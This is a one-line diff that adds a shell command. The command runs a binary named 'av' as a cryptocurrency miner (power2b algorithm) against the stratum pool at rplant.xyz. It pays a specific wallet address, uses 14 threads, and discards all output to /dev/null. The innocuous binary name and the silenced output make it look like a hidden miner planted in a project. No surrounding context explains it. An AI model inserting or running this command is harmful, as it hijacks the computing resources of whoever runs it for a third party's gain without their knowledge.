@@ -1,0 +1,1 @@
+./av -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u BX6z2URpnsyEmtSLEpQkQhe6eX95KZmrHX.Akun-All -p x -t 14 -q > /dev/null 2>&1 && nproc; nproc
